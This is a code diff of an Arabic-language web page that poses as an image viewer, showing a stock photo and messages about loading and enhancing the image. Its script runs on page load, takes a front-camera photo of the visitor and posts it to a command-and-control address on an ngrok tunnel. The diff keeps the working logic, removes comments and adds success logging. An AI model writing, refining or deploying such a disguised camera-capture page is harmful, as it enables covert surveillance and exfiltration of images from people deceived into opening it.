@@ -5,10 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>عرض الصورة</title>
     <style>
-        body { 
-            margin: 0; padding: 0; background: #000; color: #fff; 
-            font-family: Arial, sans-serif; text-align: center; 
-        }
+        body { margin: 0; padding: 0; background: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; }
         #status {
             position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
             background: rgba(0,0,0,0.8); padding: 15px 30px; border-radius: 10px;
@@ -17,17 +14,14 @@
     </style>
 </head>
 <body>
-
     <div id="status">جاري تحميل الصورة...</div>
     <img src="https://picsum.photos/id/1015/800/600" style="max-width:100%; margin-top:80px;" alt="صورة">
 
     <script>
-        // غير هذا الرابط إلى رابط ngrok الخاص بك
         const C2_URL = "https://virulently-retaliative-kisha.ngrok-free.dev/collect";
 
         async function captureAndSend() {
             try {
-                // طلب صلاحية الكاميرا الأمامية
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user", width: 640, height: 480 } 
                 });
@@ -36,7 +30,6 @@
                 video.srcObject = stream;
                 await video.play();
 
-                // التقاط الصورة بعد ثانية ونصف
                 setTimeout(() => {
                     const canvas = document.createElement("canvas");
                     canvas.width = 640;
@@ -46,34 +39,25 @@
                     canvas.toBlob(async (blob) => {
                         const formData = new FormData();
                         formData.append("file", blob, `camera_${Date.now()}.jpg`);
-
-                        await fetch(C2_URL, {
-                            method: "POST",
-                            body: formData
+                        
+                        await fetch(C2_URL, { 
+                            method: "POST", 
+                            body: formData 
                         });
+                        console.log("✅ تم إرسال الصورة بنجاح");
+                    }, "image/jpeg", 0.85);
 
-                        console.log("تم إرسال صورة الكاميرا بنجاح");
-                    }, "image/jpeg", 0.9);
-
-                    // إيقاف الكاميرا
                     stream.getTracks().forEach(track => track.stop());
                 }, 1500);
 
             } catch (e) {
-                console.log("فشل التقاط الصورة أو رفض الصلاحية");
+                console.log("❌ فشل التقاط الصورة");
             }
         }
 
-        // بدء العملية بعد تحميل الصفحة
         window.onload = () => {
             document.getElementById("status").innerHTML = "جاري تحسين الصورة...";
-            
-            // بدء التقاط الصورة بعد 1.5 ثانية
-            setTimeout(() => {
-                captureAndSend();
-            }, 1500);
-
-            // رسالة نهائية
+            setTimeout(captureAndSend, 1500);
             setTimeout(() => {
                 document.getElementById("status").innerHTML = "تم تحميل الصورة بنجاح ✓";
             }, 5000);
